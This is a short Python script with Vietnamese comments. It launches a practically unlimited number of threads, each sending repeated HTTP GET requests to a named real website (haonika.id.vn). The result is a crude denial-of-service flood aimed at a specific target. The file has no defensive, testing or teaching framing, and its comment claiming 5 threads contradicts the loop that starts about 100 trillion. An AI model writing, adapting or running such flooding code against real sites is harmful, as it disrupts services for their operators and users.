import requests
import threading
import time

url = "https://haonika.id.vn/?fbclid=IwY2xjawI7GnZleHRuA2FlbQIxMAABHRxgE8tSzf138-XITF9ROncjH867HtSXYmgX-JtXwhf5fOpL4Wl408vHMQ_aem_c-0wnQhN_WZraZrqQe5qnA"

def send_request():
    while True:
        try:
            response = requests.get(url, timeout=5)
            print(f"Thread {threading.current_thread().name} - Response: {response.status_code}")
            time.sleep(2)  # Đợi 2 giây trước khi gửi tiếp
        except requests.exceptions.RequestException as e:
            print(f"❌ Lỗi: {e}")
            time.sleep(10)

# Tạo 5 luồng để gửi request song song
threads = []
for i in range(100000000000000):
    thread = threading.Thread(target=send_request, name=f"Thread-{i+1}")
    thread.start()
    threads.append(thread)

# Chờ các luồng kết thúc (không bắt buộc)
for thread in threads:
    thread.join()
